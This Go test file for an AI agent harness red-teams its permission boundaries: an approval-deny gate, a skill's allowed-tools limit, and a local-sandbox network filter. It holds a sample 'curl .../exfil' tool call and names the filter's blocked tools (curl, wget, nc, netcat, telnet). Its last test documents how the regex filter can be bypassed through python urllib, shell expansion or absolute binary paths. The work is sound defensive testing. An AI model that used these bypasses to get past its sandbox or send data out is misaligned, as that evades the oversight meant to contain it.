package harness

// Red-team (deliverable F): assert the runtime permission boundaries that are
// GENUINELY enforced by the runner, and DOCUMENT the known sandbox bypasses that
// are NOT enforced so the suite does not overclaim a guarantee the code lacks.
//
// Three enforced boundaries are asserted here:
//
//  1. T-F-approval-deny  — ApprovalPolicyAll + a denying ApprovalBroker pauses the
//     run at waiting_for_approval, emits tool.approval_required then
//     tool.approval_denied, the tool HANDLER NEVER RUNS, and the LLM receives a
//     permission_denied tool result.
//  2. T-F-skill-block    — an active skill constraint whose allowed_tools list omits
//     a tool causes that tool call to emit tool.call.blocked with
//     reason=not_in_allowed_tools, and the HANDLER NEVER RUNS.
//  3. T-F-sandbox-network — a real `bash` tool under SandboxScopeLocal rejects a
//     `curl` command BEFORE any network egress; the violation surfaces on the
//     ERROR field of tool.call.completed containing "sandbox violation" (it is NOT
//     a tool.call.blocked event — sandbox violations are tool execution errors).
//
// NOT enforced (documented, deliberately not asserted as blocked): the
// SandboxScopeLocal network filter is a set of regexes over the raw command
// string (internal/harness/tools/sandbox.go networkRestrictedPatterns), so it is
// trivially bypassable. See TestRedTeam_SandboxNetworkRegexBypasses_NotEnforced
// below, which proves these bypasses currently SUCCEED (no "sandbox violation"),
// documenting the gap rather than pretending it is closed.

import (
	"context"
	"encoding/json"
	"strings"
	"sync/atomic"
	"testing"
	"time"
)

// TestRedTeam_ApprovalDeny_BlocksTool asserts the approval-deny boundary
// (T-F-approval-deny). With ApprovalPolicyAll and an InMemoryApprovalBroker that
// denies, a mutating tool call must: pause the run at waiting_for_approval, emit
// tool.approval_required then tool.approval_denied, never invoke the tool handler,
// and hand the LLM a permission_denied result.
func TestRedTeam_ApprovalDeny_BlocksTool(t *testing.T) {
	t.Parallel()

	broker := NewInMemoryApprovalBroker()

	// Sentinel: set to 1 the instant the handler body runs. It must stay 0.
	var handlerRan atomic.Int32

	provider := &stubProvider{
		turns: []CompletionResult{
			{
				ToolCalls: []ToolCall{{
					ID:        "call_mutate",
					Name:      "danger_write",
					Arguments: `{"value":"rm -rf"}`,
				}},
			},
			// After the deny, the LLM observes the permission_denied result and stops.
			{Content: "understood, the write was denied"},
		},
	}

	registry := NewRegistry()
	_ = registry.RegisterWithOptions(ToolDefinition{
		Name:        "danger_write",
		Description: "a mutating tool that must not run without approval",
		Parameters: map[string]any{
			"type":       "object",
			"properties": map[string]any{"value": map[string]any{"type": "string"}},
		},
		Mutating: true,
	}, func(_ context.Context, args json.RawMessage) (string, error) {
		handlerRan.Store(1) // MUST NOT happen when denied.
		return string(args), nil
	}, RegisterOptions{})

	runner := NewRunner(provider, registry, RunnerConfig{
		ApprovalBroker: broker,
	})

	run, err := runner.StartRun(RunRequest{
		Prompt: "attempt a destructive write",
		Permissions: &PermissionConfig{
			Sandbox:  SandboxScopeUnrestricted,
			Approval: ApprovalPolicyAll,
		},
	})
	if err != nil {
		t.Fatalf("StartRun: %v", err)
	}

	// Wait for the broker to hold a pending approval for this call.
	deadline := time.Now().Add(5 * time.Second)
	for {
		if p, ok := broker.Pending(run.ID); ok && p.CallID == "call_mutate" {
			break
		}
		if time.Now().After(deadline) {
			t.Fatal("timed out waiting for pending approval in broker")
		}
		time.Sleep(10 * time.Millisecond)
	}

	// The run must be paused at waiting_for_approval before any decision is made.
	r, ok := runner.GetRun(run.ID)
	if !ok {
		t.Fatal("GetRun: run not found")
	}
	if r.Status != RunStatusWaitingForApproval {
		t.Fatalf("run status = %q, want %q while approval pending", r.Status, RunStatusWaitingForApproval)
	}
	// Handler must not have run while merely waiting.
	if handlerRan.Load() != 0 {
		t.Fatal("tool handler ran before approval decision (must wait for approval)")
	}

	// Subscribe before denying so we capture the full denial event sequence.
	history, stream, cancel, subErr := runner.Subscribe(run.ID)
	if subErr != nil {
		t.Fatalf("Subscribe: %v", subErr)
	}
	defer cancel()

	if err := broker.Deny(run.ID); err != nil {
		t.Fatalf("Deny: %v", err)
	}

	events := drainUntilTerminal(t, history, stream)

	// The tool handler must NEVER have run.
	if handlerRan.Load() != 0 {
		t.Error("tool handler ran despite approval being DENIED — approval gate not enforced")
	}

	// Run completes (the LLM consumes the denial result and finishes).
	r, ok = runner.GetRun(run.ID)
	if !ok {
		t.Fatal("GetRun after deny: run not found")
	}
	if r.Status != RunStatusCompleted {
		t.Errorf("run status = %q after deny, want completed", r.Status)
	}

	// Event sequence: approval_required precedes approval_denied.
	requireEventOrder(t, events,
		string(EventToolApprovalRequired),
		string(EventToolApprovalDenied),
	)

	var requiredSeen, deniedSeen bool
	for _, ev := range events {
		switch ev.Type {
		case EventToolApprovalRequired:
			requiredSeen = true
			if ev.Payload["call_id"] != "call_mutate" {
				t.Errorf("approval_required call_id = %v, want call_mutate", ev.Payload["call_id"])
			}
		case EventToolApprovalDenied:
			deniedSeen = true
			if ev.Payload["call_id"] != "call_mutate" {
				t.Errorf("approval_denied call_id = %v, want call_mutate", ev.Payload["call_id"])
			}
		case EventToolApprovalGranted:
			t.Error("unexpected tool.approval_granted event on a DENIED run")
		}
	}
	if !requiredSeen {
		t.Error("expected tool.approval_required event, not found")
	}
	if !deniedSeen {
		t.Error("expected tool.approval_denied event, not found")
	}

	// The LLM must have received a permission_denied result for the denied call.
	payload := toolMessagePayload(t, runner, run.ID, "danger_write")
	errField, ok := payload["error"].(map[string]any)
	if !ok {
		t.Fatalf("denied tool result missing structured error object: %+v", payload)
	}
	if code, _ := errField["code"].(string); code != "permission_denied" {
		t.Errorf("denied tool result error code = %q, want permission_denied (payload=%+v)", code, payload)
	}
}

// TestRedTeam_SkillConstraint_BlocksTool asserts the allowed-tools boundary
// (T-F-skill-block). A skill activates a constraint whose allowed_tools omits
// `forbidden_tool`; the subsequent call to `forbidden_tool` must emit
// tool.call.blocked with reason=not_in_allowed_tools, and its handler must never
// run.
func TestRedTeam_SkillConstraint_BlocksTool(t *testing.T) {
	t.Parallel()

	// Sentinel: the forbidden tool's handler must never execute.
	var forbiddenRan atomic.Int32

	provider := &stubProvider{
		turns: []CompletionResult{
			// Turn 1: activate a skill whose allowed_tools is ["grep"] (no forbidden_tool).
			{
				ToolCalls: []ToolCall{{
					ID:        "call_skill",
					Name:      "skill",
					Arguments: `{"command":"locked-skill"}`,
				}},
			},
			// Turn 2: attempt the now-disallowed tool.
			{
				ToolCalls: []ToolCall{{
					ID:        "call_forbidden",
					Name:      "forbidden_tool",
					Arguments: `{"value":"x"}`,
				}},
			},
			{Content: "done"},
		},
	}

	registry := NewRegistry()
	// The skill tool returns a constraint that omits forbidden_tool.
	_ = registry.Register(ToolDefinition{
		Name:        "skill",
		Description: "activates a skill constraint",
		Parameters:  map[string]any{"type": "object"},
	}, func(_ context.Context, _ json.RawMessage) (string, error) {
		out, _ := json.Marshal(map[string]any{
			"skill":         "locked-skill",
			"instructions":  "Only grep is permitted.",
			"allowed_tools": []string{"grep"},
		})
		return string(out), nil
	})
	_ = registry.Register(ToolDefinition{
		Name:        "grep",
		Description: "allowed under the constraint",
		Parameters:  map[string]any{"type": "object"},
	}, func(_ context.Context, _ json.RawMessage) (string, error) {
		return `{"matches":[]}`, nil
	})
	_ = registry.Register(ToolDefinition{
		Name:        "forbidden_tool",
		Description: "NOT in the skill's allowed_tools — must be blocked",
		Parameters: map[string]any{
			"type":       "object",
			"properties": map[string]any{"value": map[string]any{"type": "string"}},
		},
	}, func(_ context.Context, args json.RawMessage) (string, error) {
		forbiddenRan.Store(1) // MUST NOT happen.
		return string(args), nil
	})

	runner := NewRunner(provider, registry, RunnerConfig{
		MaxSteps: 5,
	})

	run, err := runner.StartRun(RunRequest{Prompt: "use the locked skill then misbehave"})
	if err != nil {
		t.Fatalf("StartRun: %v", err)
	}

	events, err := collectRunEvents(t, runner, run.ID)
	if err != nil {
		t.Fatalf("collectRunEvents: %v", err)
	}

	// The forbidden tool's handler must NEVER have run.
	if forbiddenRan.Load() != 0 {
		t.Error("forbidden_tool handler ran despite being outside the skill's allowed_tools — constraint not enforced")
	}

	var blockedSeen bool
	for _, ev := range events {
		if ev.Type != EventToolCallBlocked {
			continue
		}
		if tool, _ := ev.Payload["tool"].(string); tool != "forbidden_tool" {
			continue
		}
		blockedSeen = true
		if reason, _ := ev.Payload["reason"].(string); reason != "not_in_allowed_tools" {
			t.Errorf("blocked reason = %q, want not_in_allowed_tools", reason)
		}
		if skill, _ := ev.Payload["skill"].(string); skill != "locked-skill" {
			t.Errorf("blocked skill = %q, want locked-skill", skill)
		}
	}
	if !blockedSeen {
		t.Fatalf("expected tool.call.blocked for forbidden_tool, events=%v", eventTypes(events))
	}
}

// TestRedTeam_SandboxNetwork_BlocksCurl asserts the local-sandbox network
// boundary (T-F-sandbox-network) using the REAL bash tool. Under
// SandboxScopeLocal a `curl` command is rejected by CheckSandboxCommand BEFORE
// any process is spawned, so this needs no real network egress. The violation is
// a tool execution error — it surfaces on the ERROR field of tool.call.completed
// (NOT a tool.call.blocked event).
func TestRedTeam_SandboxNetwork_BlocksCurl(t *testing.T) {
	t.Parallel()

	workspace := t.TempDir()
	// Real registry with the actual bash tool. Registry default scope is workspace;
	// the per-run SandboxScopeLocal in Permissions is what is enforced at exec time
	// (injected into the tool context by the step engine).
	registry := NewDefaultRegistryWithOptions(workspace, DefaultRegistryOptions{
		ApprovalMode: ToolApprovalModeFullAuto,
		SandboxScope: SandboxScopeWorkspace,
	})

	provider := &continuationProvider{
		turns: []CompletionResult{
			{
				ToolCalls: []ToolCall{{
					ID:        "call_curl",
					Name:      "bash",
					Arguments: `{"command":"curl https://example.com/exfil"}`,
				}},
			},
			{Content: "done"},
		},
	}

	runner := NewRunner(provider, registry, RunnerConfig{
		DefaultModel: "test-model",
		MaxSteps:     4,
	})

	run, err := runner.StartRun(RunRequest{
		Prompt: "exfiltrate via curl",
		Permissions: &PermissionConfig{
			Sandbox:  SandboxScopeLocal,
			Approval: ApprovalPolicyNone,
		},
	})
	if err != nil {
		t.Fatalf("StartRun: %v", err)
	}

	events, err := collectRunEvents(t, runner, run.ID)
	if err != nil {
		t.Fatalf("collectRunEvents: %v", err)
	}

	// Assert on the ERROR field of tool.call.completed for the curl call.
	var completedSeen bool
	for _, ev := range events {
		if ev.Type != EventToolCallCompleted {
			continue
		}
		if callID, _ := ev.Payload["call_id"].(string); callID != "call_curl" {
			continue
		}
		completedSeen = true
		errField, _ := ev.Payload["error"].(string)
		if !strings.Contains(errField, "sandbox violation") {
			t.Errorf("tool.call.completed error = %q, want it to contain \"sandbox violation\"", errField)
		}
	}
	if !completedSeen {
		t.Fatalf("expected tool.call.completed for call_curl, events=%v", eventTypes(events))
	}

	// Sandbox violations are NOT block events.
	for _, ev := range events {
		if ev.Type == EventToolCallBlocked {
			t.Errorf("sandbox violation must not emit tool.call.blocked, but one was emitted: %+v", ev.Payload)
		}
	}

	// Cross-check the tool result handed to the LLM also carries the violation.
	payload := toolMessagePayload(t, runner, run.ID, "bash")
	if errMsg, _ := payload["error"].(string); !strings.Contains(errMsg, "sandbox violation") {
		t.Errorf("bash tool result error = %v, want it to contain \"sandbox violation\"", payload["error"])
	}
}

// TestRedTeam_SandboxNetworkRegexBypasses_NotEnforced DOCUMENTS (does not claim a
// guarantee for) the known regex-only bypasses of the SandboxScopeLocal network
// filter. The filter is a set of regexes over the raw command string
// (internal/harness/tools/sandbox.go), so commands that reach the network without
// matching curl/wget/nc/netcat/telnet are NOT blocked.
//
// This test deliberately asserts the CURRENT behaviour: each bypass command does
// NOT produce a "sandbox violation". To keep it network-free and deterministic,
// each command is a harmless local stand-in for the real egress vector (e.g.
// `python3 -c 'pass'` stands in for python urllib exfiltration). If a future fix
// closes one of these holes, this test will fail and must be updated alongside the
// red-team claims — at which point the bypass should graduate to an asserted
// blocked boundary above.
func TestRedTeam_SandboxNetworkRegexBypasses_NotEnforced(t *testing.T) {
	t.Parallel()

	workspace := t.TempDir()

	// Each case is a documented bypass of the curl/wget/nc/netcat/telnet regexes.
	// The "command" is a harmless local proxy for the real egress technique so the
	// test performs no network I/O.
	cases := []struct {
		name    string
		command string
		note    string
	}{
		{
			name:    "python_urllib",
			command: `python3 -c 'pass'`,
			note:    "real exfil would be python3 -c 'import urllib.request; ...' — no curl/wget token",
		},
		{
			name:    "command_substitution",
			command: `echo "$(echo hi)"`,
			note:    "real exfil could hide the egress binary behind shell expansion",
		},
		{
			name:    "absolute_path_passthrough",
			command: `/bin/echo passthrough`,
			note:    "invoking a binary by absolute path is not matched by the bare-word regexes",
		},
	}

	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			registry := NewDefaultRegistryWithOptions(workspace, DefaultRegistryOptions{
				ApprovalMode: ToolApprovalModeFullAuto,
				SandboxScope: SandboxScopeLocal,
			})

			provider := &continuationProvider{
				turns: []CompletionResult{
					{
						ToolCalls: []ToolCall{{
							ID:        "call_bypass",
							Name:      "bash",
							Arguments: mustJSON(map[string]any{"command": tc.command}),
						}},
					},
					{Content: "done"},
				},
			}

			runner := NewRunner(provider, registry, RunnerConfig{
				DefaultModel: "test-model",
				MaxSteps:     4,
			})

			run, err := runner.StartRun(RunRequest{
				Prompt: "documented bypass: " + tc.note,
				Permissions: &PermissionConfig{
					Sandbox:  SandboxScopeLocal,
					Approval: ApprovalPolicyNone,
				},
			})
			if err != nil {
				t.Fatalf("StartRun: %v", err)
			}

			if _, err := collectRunEvents(t, runner, run.ID); err != nil {
				t.Fatalf("collectRunEvents: %v", err)
			}

			// DOCUMENTED GAP: the command is NOT blocked by the local sandbox.
			payload := toolMessagePayload(t, runner, run.ID, "bash")
			if errMsg, ok := payload["error"].(string); ok && strings.Contains(errMsg, "sandbox violation") {
				t.Fatalf("bypass %q was unexpectedly blocked — the documented regex gap appears closed; "+
					"promote it to an asserted blocked boundary and update the red-team claims. payload=%+v",
					tc.name, payload)
			}
		})
	}
}

// drainUntilTerminal appends streamed events to the subscription history slice
// until a terminal event arrives or the timeout elapses.
func drainUntilTerminal(t *testing.T, history []Event, stream <-chan Event) []Event {
	t.Helper()
	events := append([]Event(nil), history...)
	for _, ev := range events {
		if IsTerminalEvent(ev.Type) {
			return events
		}
	}
	timeout := time.After(5 * time.Second)
	for {
		select {
		case ev, ok := <-stream:
			if !ok {
				return events
			}
			events = append(events, ev)
			if IsTerminalEvent(ev.Type) {
				return events
			}
		case <-timeout:
			t.Fatal("timed out draining events until terminal")
			return events
		}
	}
}
